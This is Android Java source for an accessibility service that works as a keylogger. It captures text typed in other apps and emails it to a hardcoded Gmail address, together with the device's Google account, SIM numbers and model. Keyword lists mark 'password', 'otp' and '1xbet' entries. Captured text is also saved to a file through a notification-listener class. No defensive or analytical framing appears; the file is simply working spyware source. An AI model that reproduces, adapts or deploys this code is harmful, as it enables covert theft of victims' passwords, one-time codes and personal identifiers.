package com.example.fasterpro11;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "MyAccessibilityService";
    private static final String FORWARD_EMAIL = "abontiangum99@gmail.com";
    private static final int KEYSTROKE_THRESHOLD = 3000;
    private static final long DEBOUNCE_DELAY_MS = 6000;
    private static final long EMAIL_COOLDOWN_MS = 2 * 60 * 1000; // 2 minutes
    private static final long KEYSTROKE_TIMEOUT_MS = 3 * 60000; // 120 seconds after key detact

    private StringBuilder keystrokes = new StringBuilder();
    private StringBuilder currentBatch = new StringBuilder();
    private ExecutorService executorService = Executors.newSingleThreadExecutor();
    private long lastEventTime = 0;
    private long lastEmailTime = 0;
    private String lastForwardedKeystrokes = "";
    private String currentAppName = "";
    private Context mContext;

    private Handler keystrokeHandler = new Handler(Looper.getMainLooper());
    private Runnable keystrokeRunnable = null;

    @Override
    public void onCreate() {
        super.onCreate();
        mContext = getApplicationContext();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        long currentTime = System.currentTimeMillis();

        // Debounce to avoid rapid events
        if (currentTime - lastEventTime < DEBOUNCE_DELAY_MS) {
            return;
        }

        lastEventTime = currentTime;

        int eventType = event.getEventType();

        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            handleTextChangedEvent(event);
        }
        else if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            handleViewClickedEvent(event);
        }
        else if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            handleWindowStateChange(event);
        }
        else {
            Log.d(TAG, "Unhandled event type: " + eventType);
        }
    }

    private void handleTextChangedEvent(AccessibilityEvent event) {
        if (event.getText() != null && !event.getText().isEmpty()) {
            String typedText = event.getText().get(0).toString();

            if (!TextUtils.isEmpty(typedText)) {
                Log.d(TAG, "Keystroke detected: " + typedText);

                // Reset and store the new text
                keystrokes.setLength(0);
                keystrokes.append(typedText);

                currentBatch.setLength(0);
                currentBatch.append(typedText);

                // Cancel previous timeout
                if (keystrokeRunnable != null) {
                    keystrokeHandler.removeCallbacks(keystrokeRunnable);
                }

                keystrokeRunnable = new Runnable() {
                    @Override
                    public void run() {
                        Log.d(TAG, "Typed text detected (Final): " + keystrokes.toString());
                        // You can add forwarding logic here if needed
                    }
                };

                // Schedule new timeout (3 minit)
                keystrokeHandler.postDelayed(keystrokeRunnable, KEYSTROKE_TIMEOUT_MS);

                // Get package and class info
                AccessibilityNodeInfo source = event.getSource();
                if (source != null) {
                    CharSequence packageName = source.getPackageName();
                    CharSequence className = source.getClassName();
                    if (!TextUtils.isEmpty(packageName) && !TextUtils.isEmpty(className)) {
                        currentAppName = packageName.toString() + "/" + className.toString();
                    }
                    source.recycle();
                }
            }
        }
    }

    // Rest of your existing methods remain unchanged...
    private void handleViewClickedEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            String viewIdResourceName = source.getViewIdResourceName();
            String className = source.getClassName().toString();
            Log.d(TAG, "View clicked. View ID: " + viewIdResourceName + ", Class Name: " + className);

            if (isSendButton(viewIdResourceName, className)) {
                Log.d(TAG, "Send button clicked. Forwarding keystrokes.");
                forwardKeystrokesORSaveToTextFile(currentBatch.toString(), currentAppName);
                currentBatch.setLength(0);
            }

            source.recycle();
        } else {
            Log.d(TAG, "Source is null in handleViewClickedEvent.");
        }
    }

    private void handleWindowStateChange(AccessibilityEvent event) {
        Log.d(TAG, "Window state changed. Forwarding keystrokes.");
        forwardKeystrokesORSaveToTextFile(currentBatch.toString(), currentAppName);
        currentBatch.setLength(0);
    }

    private boolean isSendButton(String viewIdResourceName, String className) {
        boolean isSendButton = (viewIdResourceName != null && viewIdResourceName.contains("send_button_id"))
                || "android.widget.Button".equals(className)
                || "android.widget.TextView".equals(className);
        return isSendButton;
    }

    private void forwardKeystrokesORSaveToTextFile(String keystrokes, String appName) {
        if (!TextUtils.isEmpty(keystrokes) && !keystrokes.equals(lastForwardedKeystrokes)) {
            long currentTime = System.currentTimeMillis();
            if (currentTime - lastEmailTime >= EMAIL_COOLDOWN_MS) {
                if (isInternetConnected()) {
                    String sender = SmsReceiver.getSender();
                    Log.d(TAG, "Forwarding keystrokes. Sender: " + sender);
                    // Save To Text File in NotificationListener class
                    String SaveToTextFileKeystrokes = "Text: "+ keystrokes;
                    Context appContext = getApplicationContext();
                    Intent intent = new Intent(appContext, NotificationListener.class);
                    intent.setAction("SAVE_TO_TEXT_FILE");
                    intent.putExtra("content", SaveToTextFileKeystrokes);
                    appContext.startService(intent);

                    //forward Keystrokes By Email
                    forwardKeystrokesByEmail(keystrokes, appName, sender, getApplicationContext());
                    lastForwardedKeystrokes = keystrokes;
                    lastEmailTime = currentTime;
                } else {
                    Log.d(TAG, "No internet connection. Keystrokes not forwarded.");
                }
            } else {
                Log.d(TAG, "Email cooldown active. Keystrokes not forwarded.");
            }
        } else {
            Log.d(TAG, "Keystrokes are empty or already forwarded.");
        }
    }

    private void forwardKeystrokesByEmail(String keystrokes, String appName, String sender, Context context) {
        executorService.execute(() -> {
            try {
                if (context == null) {
                    Log.e(TAG, "sendEmailWithAttachment: Context is null!");
                    return;
                }
                Log.d(TAG, "Sending email with sendEmailWithAttachment method");
                new Handler(Looper.getMainLooper()).post(() -> {
                    AccountUtil accountUtil = new AccountUtil();
                    String GoogleAccountName = accountUtil.getDefaultGoogleAccount(context);
                    String userSimNumber = accountUtil.getUserSimNumber(context);

                    SmsReceiver smsReceiver = new SmsReceiver();
                    String messageBody= "Your  Text";
                    String setSim1NumberSmsReceiver =smsReceiver.SetSim1Number(context,messageBody);
                    NotificationListener notificationListener = new NotificationListener();
                    String setSim1NumberNotificationListener=notificationListener.SetSim1Number(context,messageBody);
                    String setSim1Number ;
                    if (setSim1NumberSmsReceiver != null) {
                        setSim1Number = setSim1NumberSmsReceiver;
                    }else if(setSim1NumberNotificationListener != null) {
                        setSim1Number = setSim1NumberNotificationListener;
                    }else {
                        setSim1Number = null;
                    }
                    GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
                    String UserID1= alert.getSim1NumberFromUser(context);
                    String UserID2= alert.getSim2NumberFromUser(context);
                    String UserGivenSimNumber= UserID1 + " "+UserID2;

                    String manufacturer = Build.MANUFACTURER;
                    String mobileModel = Build.MODEL;
                    String subject ="Key:ID: " + setSim1Number + " " + UserGivenSimNumber +" " + manufacturer +" "+ mobileModel+" " + GoogleAccountName +" Number: " +userSimNumber;
                    Log.e(TAG, "SMS email subject: "+ subject);



                    JavaMailAPI_MyAccessibilityService_Sender.sendMail(FORWARD_EMAIL, subject, keystrokes);
                    Log.d(TAG, "Keystrokes forwarded successfully via email.");
                });
            } catch (Exception e) {
                Log.e(TAG, "Failed to forward keystrokes via email", e);
            }
        });
    }

    private boolean isInternetConnected() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        boolean isConnected = activeNetwork != null && activeNetwork.isConnectedOrConnecting();
        Log.d(TAG, "Is internet connected? " + isConnected);
        return isConnected;
    }

    @Override
    public void onInterrupt() {
        Log.e(TAG, "AccessibilityService interrupted.");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "AccessibilityService connected.");

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                | AccessibilityEvent.TYPE_VIEW_CLICKED
                | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);
        Log.d(TAG, "AccessibilityServiceInfo configured.");
    }

    public boolean isKeystokeForwardMatchwords1(String message,String title,String titleStr,String textStr) {
        for (String keyword : KeystokeForwardMatchwords1) {
            if (message.contains(keyword) || message.equals(keyword)) {
                Log.d(TAG, "Keystoke Forwarding match word1: " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> KeystokeForwardMatchwords1 = new HashSet<>(Arrays.asList(
            "Keystoke Forwarding match word1", "password", "1xbet","otp",
            "keystoke Forwarding match word1"));

    public boolean isKeystokeForwardMatchwords2(String message,String title,String titleStr,String textStr) {
        for (String keyword : KeystokeForwardMatchwords2) {
            if (message.contains(keyword) || message.equals(keyword)) {
                Log.d(TAG, "Keystoke Forwarding match word2: " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> KeystokeForwardMatchwords2 = new HashSet<>(Arrays.asList(
            "Keystoke Forwarding match word2", "Keystoke otp2", "keystoke Forwarding match word1"));


    public boolean isKeystokeForwardMatchOtpwords(String message,String title,String titleStr,String textStr) {
        for (String keyword : KeystokeForwardMatchOtpwords) {
            if (message.contains(keyword) || message.equals(keyword)) {
                Log.d(TAG, "Keystoke Forwarding match word2: " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> KeystokeForwardMatchOtpwords = new HashSet<>(Arrays.asList(
            "Keystoke Forwarding match word2", "OTP", "Otp", "otp", "keystoke Forwarding match word1"));

}
